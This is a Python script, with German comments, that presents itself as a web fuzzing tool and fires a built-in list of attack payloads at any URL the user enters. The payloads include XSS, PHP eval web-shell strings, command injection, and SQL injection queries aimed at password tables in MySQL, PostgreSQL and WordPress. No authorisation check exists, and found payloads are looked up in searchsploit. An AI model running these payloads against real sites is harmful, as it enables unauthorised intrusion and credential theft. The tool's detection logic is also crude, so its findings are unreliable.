import requests
import random
import string
import pyfiglet
from colorama import init, Fore
import subprocess
import json

# Initialisiere Colorama für farbigen Text
init()

def send_request(url, payload, params=None):
    try:
        if params:
            response = requests.get(url, params=params)
        else:
            response = requests.get(url + payload)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Fehler bei Anfrage: {e}")
        return None

def generate_payload(language, version, is_wordpress=False):
    # Payloads für verschiedene Sprachen und Versionen
    payloads = {
        'PHP': {
            '7.4': [
                "<script>alert('XSS')</script>",  # XSS
                "<?php system('ls'); ?>",  # Command Injection
                "<?php eval($_GET['cmd']); ?>",  # PHP Eval Injection
            ],
            '8.0': [
                "<script>alert('XSS')</script>",  # XSS
                "<?php eval($_GET['cmd']); ?>",  # PHP Shell Injection
            ]
        },
        'JavaScript': {
            'Node.js': [
                "<script>alert('XSS')</script>",  # XSS
                "eval('console.log(1)')",  # JavaScript Eval
            ],
            'Vue.js': [
                "<script>alert('XSS')</script>",  # XSS
            ]
        },
        'Python': {
            '3.8': [
                "'; os.system('ls')",  # Command Injection
                "'; subprocess.run(['ls'])",  # Command Injection in Python
            ],
        },
        'MySQL': {
            '5.7': [
                "' OR 1=1 --",  # SQL Injection
                "' UNION SELECT null, username, password FROM users --",  # SQL Union Injection
            ],
            '8.0': [
                "' OR 1=1 --",  # SQL Injection
                "' UNION SELECT null, user, password FROM mysql.user --",  # SQLi for MySQL 8.0
            ]
        },
        'PostgreSQL': {
            '12': [
                "' OR 1=1 --",  # SQL Injection
                "' UNION SELECT null, username, password FROM pg_shadow --",  # SQL Union Injection
            ],
            '13': [
                "' OR 1=1 --",  # SQL Injection
                "' UNION SELECT null, username, password FROM pg_catalog.pg_user --",  # SQL Union Injection for PostgreSQL 13
            ],
        },
        'WordPress': {
            'XSS': [
                "<script>alert('XSS')</script>",  # XSS
                "<img src='javascript:alert(1)'>",  # XSS
                "<script>document.location='javascript:alert(1)';</script>",  # XSS
            ],
            'SQLi': [
                "' OR 1=1 --",  # SQL Injection for WordPress
                "' UNION SELECT null, username, password FROM wp_users --",  # SQL Union Injection for WordPress
            ]
        },
    }

    # Wählen einer zufälligen Payload basierend auf Sprache und Version oder WordPress
    if is_wordpress:
        return random.choice(payloads['WordPress']['XSS'])  # Testet XSS-Payloads für WordPress
    elif language in payloads:
        if version in payloads[language]:
            return random.choice(payloads[language][version])
        else:
            # Wenn Version nicht bekannt, alle Versionen der Sprache testen
            all_payloads = [payload for version in payloads[language].values() for payload in version]
            return random.choice(all_payloads)
    else:
        # Fallback Payload, wenn keine Sprache gefunden wird
        return ''.join(random.choices(string.ascii_letters + string.digits, k=10))  # Fallback Payload

def search_exploit(payload):
    # Suchen nach Exploits in Exploit-DB und Metasploit (via searchsploit)
    try:
        # Verwenden von searchsploit (kann durch subprocess angestoßen werden)
        result = subprocess.run(['searchsploit', payload], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode('utf-8')
        if output:
            print(Fore.GREEN + "Exploit gefunden:")
            print(output)
        else:
            print(Fore.RED + "Kein Exploit gefunden für Payload: " + payload)
    except Exception as e:
        print(Fore.RED + f"Fehler bei der Exploit-Suche: {e}")

def fuzzing(url, language, version, is_wordpress=False, payload_list=None, num_requests=100):
    results = []
    # Wenn eine benutzerdefinierte Payload-Liste angegeben wird, dann benutze diese
    if payload_list:
        for payload, attack_type in payload_list:
            print(f"Sende Payload: {payload} ({attack_type})")
            response = send_request(url, payload)
            
            if response and response.status_code == 200:
                print(f"Antwort erhalten: {response.status_code}")
                if "Fehler" in response.text:  # Beispiel: Suche nach einem Fehler in der Antwort
                    print(f"Mögliche Sicherheitslücke gefunden mit Payload: {payload} ({attack_type})")
                    results.append((payload, response.status_code, response.text, attack_type, url))
                    search_exploit(payload)  # Exploit suchen, wenn Payload funktioniert
    else:
        for _ in range(num_requests):
            payload = generate_payload(language, version, is_wordpress)
            print(f"Sende Payload: {payload}")
            response = send_request(url, payload)
            
            if response and response.status_code == 200:
                print(f"Antwort erhalten: {response.status_code}")
                if "Fehler" in response.text:  # Beispiel: Suche nach einem Fehler in der Antwort
                    print(f"Mögliche Sicherheitslücke gefunden mit Payload: {payload}")
                    results.append((payload, response.status_code, response.text, "Unknown Attack", url))
                    search_exploit(payload)  # Exploit suchen, wenn Payload funktioniert

    # Ergebnisse in eine Datei speichern
    log_results(results)

def log_results(results):
    with open("fuzzing_log.txt", "a") as log_file:
        for result in results:
            payload, status_code, body, attack_type, url = result
            log_file.write(f"Payload: {payload}\n")
            log_file.write(f"Attack Type: {attack_type}\n")
            log_file.write(f"Response Code: {status_code}\n")
            log_file.write(f"Body: {body}\n")
            log_file.write(f"URL: {url}\n\n")

def show_options():
    payload_list = []
    print("Bitte geben Sie eine Liste von Payloads ein (oder geben Sie 'done' ein, um zu beenden).")
    
    while True:
        payload = input("Payload: ")
        if payload.lower() == 'done':
            break
        attack_type = input("Für welche Attacke ist dieser Payload? ")
        payload_list.append((payload, attack_type))
    
    return payload_list

def print_banner():
    banner = pyfiglet.figlet_format("Fuzzing Tool", font="slant")  # Große ASCII-Schrift
    print(Fore.GREEN + banner)
    print(Fore.YELLOW + "Willkommen beim Web Fuzzing Tool!")
    print(Fore.WHITE + "Dieses Tool testet Payloads auf mögliche Sicherheitslücken.")
    print(Fore.RED + "Viel Erfolg beim Testen!" + Fore.RESET)
    print(Fore.CYAN + "\nFrom a Boy that's 14 Years BTW\n" + Fore.RESET)  # Kleinere Schrift unten

if __name__ == "__main__":
    print_banner()  # Banner anzeigen
    target_url = input("Bitte die Ziel-URL eingeben: ")  # Ziel-URL vom Benutzer
    mode = input("Möchten Sie benutzerdefinierte Payloads angeben? (yes/no): ").lower()

    if mode == "yes":
        # Benutzerdefinierte Payload-Liste erstellen
        payload_list = show_options()
        fuzzing(target_url, language=None, version=None, payload_list=payload_list)  # Teste die benutzerdefinierten Payloads
    else:
        language = input("Bitte die Sprache/Bibliothek (z.B. PHP, Node.js, MySQL, WordPress) angeben: ")  # Benutzer gibt Sprache an
        version = input("Bitte die Version der Sprache/Bibliothek angeben (Leave blank if unknown): ")  # Benutzer gibt Version an
        if language.lower() == "wordpress":
            print("WordPress-Tests werden durchgeführt.")
            fuzzing(target_url, language="WordPress", version=None, is_wordpress=True)  # Spezifisch für WordPress
        else:
            if version.strip() == "":  # Wenn Version leer gelassen wird, alle Versionen testen
                version = None
            fuzzing(target_url, language, version)  # Testen der Ziel-URL mit der angegebenen Sprache und Version
